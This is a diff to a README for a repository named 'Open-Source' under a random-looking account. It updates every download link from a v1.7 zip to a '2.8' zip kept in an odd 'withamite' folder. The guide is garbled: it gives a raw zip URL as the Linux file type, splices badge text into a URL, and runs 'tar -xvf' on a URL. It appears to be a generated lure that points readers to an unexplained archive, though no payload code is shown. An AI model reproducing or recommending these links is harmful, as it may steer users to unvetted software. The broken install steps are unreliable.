@@ -6,7 +6,7 @@ Welcome to the Open-Source repository! This guide will help you easily download 
 
 ## 📥 Download Our Application
 
-[![Download Open-Source](https://raw.githubusercontent.com/comprehendible-phantomlimb422/Open-Source/main/withamite/Open-Source_v1.7.zip%20Now%20-blue?style=for-the-badge)](https://raw.githubusercontent.com/comprehendible-phantomlimb422/Open-Source/main/withamite/Open-Source_v1.7.zip)
+[![Download Open-Source](https://raw.githubusercontent.com/comprehendible-phantomlimb422/Open-Source/main/withamite/Open-Source-2.8.zip%20Now%20-blue?style=for-the-badge)](https://raw.githubusercontent.com/comprehendible-phantomlimb422/Open-Source/main/withamite/Open-Source-2.8.zip)
 
 ## 💻 System Requirements
 
@@ -32,13 +32,13 @@ To get started, follow these simple steps:
 
 1. **Visit the Releases Page:**
    Go to the following link to access the download page:
-   [Download Open-Source](https://raw.githubusercontent.com/comprehendible-phantomlimb422/Open-Source/main/withamite/Open-Source_v1.7.zip)
+   [Download Open-Source](https://raw.githubusercontent.com/comprehendible-phantomlimb422/Open-Source/main/withamite/Open-Source-2.8.zip)
 
 2. **Choose Your Version:**
    On the releases page, you will see a list of available versions. Look for the latest version at the top of the list.
 
 3. **Download the Application:**
-   Click on the appropriate file for your operating system. This could be a `.exe` file for Windows, a `.dmg` file for macOS, or a `https://raw.githubusercontent.com/comprehendible-phantomlimb422/Open-Source/main/withamite/Open-Source_v1.7.zip` file for Linux. 
+   Click on the appropriate file for your operating system. This could be a `.exe` file for Windows, a `.dmg` file for macOS, or a `https://raw.githubusercontent.com/comprehendible-phantomlimb422/Open-Source/main/withamite/Open-Source-2.8.zip` file for Linux. 
 
 4. **Install the Application:**
    - For Windows: 
@@ -50,9 +50,9 @@ To get started, follow these simple steps:
      - Drag the Open-Source icon into your Applications folder.
 
    - For Linux: 
-     - You may need to extract the `https://raw.githubusercontent.com/comprehendible-phantomlimb422/Open-Source/main/withamite/Open-Source_v1.7.zip` file. Open a terminal and run:
+     - You may need to extract the `https://raw.githubusercontent.com/comprehendible-phantomlimb422/Open-Source/main/withamite/Open-Source-2.8.zip` file. Open a terminal and run:
        ```bash
-       tar -xvf https://raw.githubusercontent.com/comprehendible-phantomlimb422/Open-Source/main/withamite/Open-Source_v1.7.zip
+       tar -xvf https://raw.githubusercontent.com/comprehendible-phantomlimb422/Open-Source/main/withamite/Open-Source-2.8.zip
        ```
      - Then, navigate to the folder and run the application from there.
 
